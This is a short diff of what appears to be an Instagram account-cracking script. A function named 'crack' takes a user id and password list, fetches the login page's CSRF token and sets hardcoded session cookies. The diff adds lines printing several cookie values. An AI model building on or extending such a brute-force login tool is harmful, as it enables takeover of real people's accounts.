@@ -127,6 +127,13 @@ def crack(uid, pww, total_idz):
             response = session.get('https://www.instagram.com/accounts/login/')
             csrf_token = response.cookies['csrftoken']
             print(f"\r\033[1;92m [cookie] {csrf_token}")
+            print(f"\r\033[1;92m [cookie] {mid}")
+            print(f"\r\033[1;92m [cookie] {ig_did}")
+            print(f"\r\033[1;92m [cookie] {ig_nrcb}")
+            print(f"\r\033[1;92m [cookie] {datr}")
+            print(f"\r\033[1;92m [cookie] {ps_l}")
+            print(f"\r\033[1;92m [cookie] {ps_n}")
+            print(f"\r\033[1;92m [cookie] {wd}")
             cookies = {
                 'csrftoken': csrf_token,
                 'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
